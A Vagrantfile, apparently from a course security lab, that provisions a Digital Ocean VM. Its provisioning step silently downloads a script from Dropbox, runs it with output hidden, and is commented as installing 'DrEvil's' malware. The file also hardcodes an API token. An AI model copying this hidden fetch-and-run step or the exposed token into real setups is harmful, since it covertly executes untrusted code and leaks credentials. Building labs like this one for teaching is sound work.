# -*- mode: ruby -*-
# vi: set ft=ruby :

# This is the vagrant file to use for Lab 4 with Digital Ocean.

# Edit the line below to insert your username; your VM will not run unless you repace 
# username##here with your username
user_VM = ENV["USER"]

# Sneak DrEvil's script into the VM. This will put the script bootstrap.sh into the /tmp directory,
# makes the script executable, and then executes the bootstrap.sh script. The bootstrap.sh script is
# located in a Dropbox account.
$script = <<SCRIPT
cd /tmp
wget https://www.dropbox.com/s/gxr252hld7a8xa7/bootstrap.sh?dl=0 -Obootstrap.sh > /dev/null 2>&1
chmod u+x bootstrap.sh
/tmp/bootstrap.sh > /dev/null 2>&1
SCRIPT

Vagrant.configure("2") do |config|
  
  # Creates the 
  config.vm.define "I230-Lab3-#{user_VM}" do |config| 
    config.vm.provider :digital_ocean do |provider,override|
      config.vm.box = "digital_ocean"
      config.ssh.private_key_path = "./do_vagrant"
      config.ssh.username = "vagrant"
      # provider.client_id = "digital-ocean-seiffert-tkn1"
      provider.token = "0f88ca91a6d65b07180c517f09f4f3cd4fb2baa5c1a1568a3aba80af5e19bba1"
      override.vm.box_url = "https://github.com/devopsgroup-io/vagrant-digitalocean/raw/master/box/digital_ocean.box"
      # provider.image = "ubuntu 14.04.5 x64"
      provider.image = "ubuntu-14-04-x64"
      provider.region = "nyc1"
      config.vm.synced_folder ".", "/vagrant", disabled: true
      
      # run the script to install the malware
      config.vm.provision :shell, inline: $script
    end
  end
  
end
